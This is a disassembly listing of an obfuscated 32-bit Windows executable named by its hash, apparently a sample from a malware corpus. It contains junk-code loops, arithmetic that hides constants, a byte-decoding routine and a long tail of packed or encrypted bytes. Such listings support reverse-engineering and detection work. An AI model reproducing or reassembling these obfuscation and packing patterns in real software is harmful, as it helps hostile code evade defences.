
b1b462bb542f207942a20d967597b4f05cafb906f46d16f11787abf6f3801675.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	int3   
  40190d:	(bad)  
  40190e:	pop    ebp
  40190f:	sub    DWORD PTR [edx+0x62],esp
  401912:	bound  esp,QWORD PTR [edx+0x1a]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	xor    esp,DWORD PTR [esi+0x2a717272]
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x71e9b0f1
  4019bd:	int3   
  4019be:	shl    esp,0xf4
  4019c1:	or     DWORD PTR [ebp+0x25bbbbf3],esi
  4019c7:	mov    WORD PTR [ebx-0x6c2a5951],ds
  4019cd:	xchg   edi,eax
  4019ce:	adc    eax,0xd56de015
  4019d3:	mov    ch,0x59
  4019d5:	dec    ecx
  4019d6:	push   ebx
  4019d7:	clc    
  4019d8:	scas   eax,DWORD PTR es:[edi]
  4019d9:	jge    0x401a57
  4019db:	dec    edx
  4019dc:	lahf   
  4019dd:	retfw  
  4019df:	enter  0x33df,0x7c
  4019e3:	js     0x401a5c
  4019e5:	stos   BYTE PTR es:[edi],al
  4019e6:	mov    dl,0xdf
  4019e8:	cli    
  4019e9:	sbb    ah,BYTE PTR [esi-0xc4e5de2]
  4019ef:	ds in  eax,0x7d
  4019f2:	add    cl,BYTE PTR [eax+0x4c]
  4019f5:	std    
  4019f6:	mov    ds:0x8727426f,eax
  4019fb:	mov    ebx,0xb1978617
  401a00:	test   esp,edi
  401a02:	outs   dx,DWORD PTR ds:[esi]
  401a03:	scas   eax,DWORD PTR es:[edi]
  401a04:	adc    cl,dh
  401a06:	loopne 0x401a63
  401a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a09:	loopne 0x401995
  401a0b:	mov    BYTE PTR [eax+0x6f],bh
  401a0e:	fwait
  401a0f:	shl    DWORD PTR [edx+0x4],1
  401a12:	sub    BYTE PTR [edx-0x79],ch
  401a15:	outs   dx,BYTE PTR ds:[esi]
  401a16:	xor    ebx,DWORD PTR [ecx-0x26]
  401a19:	cld    
  401a1a:	ja     0x401a5c
  401a1c:	mov    dl,0x86
  401a1e:	jo     0x401a31
  401a20:	hlt    
  401a21:	jp     0x4019b0
  401a23:	mov    al,0x80
  401a25:	mov    al,ds:0xebd4ce22
  401a2a:	or     eax,0xf0e6de32
  401a2f:	or     dl,ah
  401a31:	pop    esi
  401a32:	loope  0x401a46
  401a34:	scas   al,BYTE PTR es:[edi]
  401a35:	nop
  401a36:	fwait
  401a37:	sub    DWORD PTR [edx-0x66ebf6df],edx
  401a3d:	or     BYTE PTR [esi-0x1d],dh
  401a40:	out    0x95,al
  401a42:	les    eax,FWORD PTR [esi+0x2a]
  401a45:	mov    edi,DWORD PTR [edi-0x3bb84726]
  401a4b:	(bad)  
  401a4c:	sbb    BYTE PTR [edx],dh
  401a4e:	pop    ss
  401a4f:	dec    ebx
  401a50:	sbb    DWORD PTR [ebp+eax*8+0x1f],edx
  401a54:	fistp  WORD PTR [esi+ebp*4-0x31d5ea76]
  401a5b:	xor    esi,ecx
  401a5d:	stc    
  401a5e:	inc    ebx
  401a5f:	or     bl,BYTE PTR [edx+0x14472e02]
  401a65:	add    al,0xc2
  401a67:	jb     0x401ab3
  401a69:	push   esi
  401a6a:	add    edi,DWORD PTR [edi+0x7977d88e]
  401a70:	out    dx,al
  401a71:	mov    WORD PTR [esp+ebx*4],?
  401a74:	or     eax,0x7631ff02
  401a79:	or     edx,DWORD PTR [esi]
  401a7b:	ja     0x401a80
  401a7d:	aam    0x83
  401a7f:	inc    edi
  401a80:	sub    al,0xdd
  401a82:	push   esi
  401a83:	inc    ecx
  401a84:	xor    bh,BYTE PTR [ebx]
  401a86:	cmp    eax,DWORD PTR [esi-0x4e]
  401a89:	out    dx,al
  401a8a:	cmp    al,0xdf
  401a8c:	mov    ah,0x8e
  401a8e:	mov    ebx,0x1b1db3c1
  401a93:	clc    
  401a94:	xor    eax,0x16deb867
  401a99:	jl     0x401a5f
  401a9b:	push   DWORD PTR [ecx+0x62]
